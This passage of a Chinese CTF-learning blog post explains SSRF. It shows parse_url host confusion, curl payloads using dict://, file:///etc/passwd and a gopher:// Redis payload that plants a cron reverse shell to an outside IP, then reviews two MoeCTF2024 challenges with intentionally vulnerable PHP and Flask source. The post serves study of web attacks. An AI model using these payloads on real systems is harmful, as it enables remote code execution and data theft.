+
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://ctf.@127.0.0.1/flag.php?show&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//运行结果:</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;scheme&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">  [<span class="string">&quot;user&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;ctf.&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;/flag.php&quot;</span></span><br><span class="line">  [<span class="string">&quot;query&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;show&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="常用Payload"><a href="#常用Payload" class="headerlink" title="常用Payload"></a>常用Payload</h3><p>以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> -vvv &#x27;dict://<span class="number">127.0.0.1:6379</span>/info&#x27;</span><br><span class="line"></span><br><span class="line"><span class="attribute">curl</span> -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class="line"></span><br><span class="line"><span class="comment"># * 注意: 链接使用单引号，避免$变量问题</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">curl</span> -vvv &#x27;gopher://<span class="number">127.0.0.1:6379</span>/_*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">8</span>%<span class="number">0</span>d%<span class="number">0</span>aflushall%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a1%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">64</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a*/<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">103.21.140.84</span>/<span class="number">6789</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>adir%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">16</span>%<span class="number">0</span>d%<span class="number">0</span>a/var/spool/cron/%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">10</span>%<span class="number">0</span>d%<span class="number">0</span>adbfilename%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>aroot%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>asave%<span class="number">0</span>d%<span class="number">0</span>aquit%<span class="number">0</span>d%<span class="number">0</span>a&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gopher</span>://<span class="number">127.0.0.1:6379</span>/_*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">8</span>%<span class="number">0</span>d%<span class="number">0</span>aflushall%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a1%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">64</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a*/<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">127.0.0.1</span>/<span class="number">45952</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>adir%<span class="number">0</span>d%<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>经过url解码便是：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gopher</span>://<span class="number">127.0.0.1:6379</span>/_*<span class="number">1</span> $<span class="number">8</span> flushall *<span class="number">3</span> $<span class="number">3</span> set $<span class="number">1</span> <span class="number">1</span> $<span class="number">64</span> */<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">127.0.0.1</span>/<span class="number">45952</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> *<span class="number">4</span> $<span class="number">6</span> config $<span class="number">3</span> set $<span class="number">3</span> dir $<span class="number">16</span> /var/www/html/ *<span class="number">4</span> $<span class="number">6</span> config $<span class="number">3</span> set $<span class="number">10</span> dbfilename $<span class="number">4</span> root *<span class="number">1</span> $<span class="number">4</span> save quit</span><br></pre></td></tr></table></figure>
+
+<h2 id="题目回顾"><a href="#题目回顾" class="headerlink" title="题目回顾"></a>题目回顾</h2><p>回顾一下MoeCTF2024中的两道SSRF题目吧：</p>
+<h3 id="ImageCloud前置"><a href="#ImageCloud前置" class="headerlink" title="ImageCloud前置"></a><strong>ImageCloud前置</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$image_info</span> = <span class="title function_ invoke__">getimagesizefromstring</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$mime_type</span> = <span class="variable">$image_info</span>[<span class="string">&#x27;mime&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: &#x27;</span> . <span class="variable">$mime_type</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当时并不能看懂，现在就能有些认知了。看到<code>curl_exec</code>、<code>curl_init</code>之类很明显的SSRF特征。</p>
+<p>题目提示flag在&#x2F;etc&#x2F;passwd里，于是我们直接利用file伪协议读取flag文件即可：<br><code>payload: file:///etc/passwd</code>。</p>
+<h3 id="ImageCloud"><a href="#ImageCloud" class="headerlink" title="ImageCloud"></a><strong>ImageCloud</strong></h3><p>app.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, abort, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;static/&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">uploaded_files = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;图片上传&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;/upload&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;已上传的图片&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">        <span class="string">f&#x27;&lt;li&gt;&lt;a href=&quot;/image?url=http://localhost:5000/static/<span class="subst">&#123;filename&#125;</span>&quot;&gt;<span class="subst">&#123;filename&#125;</span>&lt;/a&gt;&lt;/li&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> uploaded_files</span><br><span class="line">    ) + <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;/ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;未找到文件部分&#x27;</span>, <span class="number">400</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;未选择文件&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        ext = filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower()</span><br><span class="line"></span><br><span class="line">        unique_filename = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(uploaded_files)&#125;</span>_<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">        filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], unique_filename)</span><br><span class="line"></span><br><span class="line">        file.save(filepath)</span><br><span class="line">        uploaded_files.append(unique_filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;文件类型不支持&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/image&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_image</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;URL 参数缺失&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">        img = Image.<span class="built_in">open</span>(BytesIO(response.content))</span><br><span class="line"></span><br><span class="line">        img_io = BytesIO()</span><br><span class="line">        img.save(img_io, img.<span class="built_in">format</span>)</span><br><span class="line">        img_io.seek(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> send_file(img_io, mimetype=img.get_format_mimetype())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;无法加载图片: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(UPLOAD_FOLDER):</span><br><span class="line">        os.makedirs(UPLOAD_FOLDER)</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>app2.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, abort, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;uploads/&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">uploaded_files = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mimetype</span>(<span class="params">file_path</span>):</span><br><span class="line">    mime = mimetypes.guess_type(file_path)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> mime <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> Image.<span class="built_in">open</span>(file_path) <span class="keyword">as</span> img:</span><br><span class="line">                mime = img.get_format_mimetype()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            mime = <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> mime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_free_port_in_range</span>(<span class="params">start_port, end_port</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        port = random.randint(start_port, end_port)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, port))</span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">return</span> port </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;图片上传&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;/upload&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;已上传的图片&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;&lt;li&gt;&lt;a href=&quot;/image/<span class="subst">&#123;filename&#125;</span>&quot;&gt;<span class="subst">&#123;filename&#125;</span>&lt;/a&gt;&lt;/li&gt;&#x27;</span> <span class="keyword">for</span> filename <span class="keyword">in</span> uploaded_files) + <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;/ul&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;未找到文件部分&#x27;</span>, <span class="number">400</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;未选择文件&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line"></span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        ext = filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower()</span><br><span class="line"></span><br><span class="line">        unique_filename = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(uploaded_files)&#125;</span>_<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">        filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], unique_filename)</span><br><span class="line"></span><br><span class="line">        file.save(filepath)</span><br><span class="line">        uploaded_files.append(unique_filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;文件类型不支持&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/image/&lt;filename&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_image</span>(<span class="params">filename</span>):</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        mime = get_mimetype(filepath)</span><br><span class="line">        <span class="keyword">return</span> send_file(filepath, mimetype=mime)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;文件未找到&#x27;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(UPLOAD_FOLDER):</span><br><span class="line">        os.makedirs(UPLOAD_FOLDER)</span><br><span class="line">    port = find_free_port_in_range(<span class="number">5001</span>, <span class="number">6000</span>)</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=port)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>附件可知，flag一图片形式被存储在内网的uploads文件夹下面，并通过image目录访问，外部服务开放指定端口5000，内部服务则开放在5001-6000的随机端口，</p>
+<p>这里画了张图用来理解：</p>
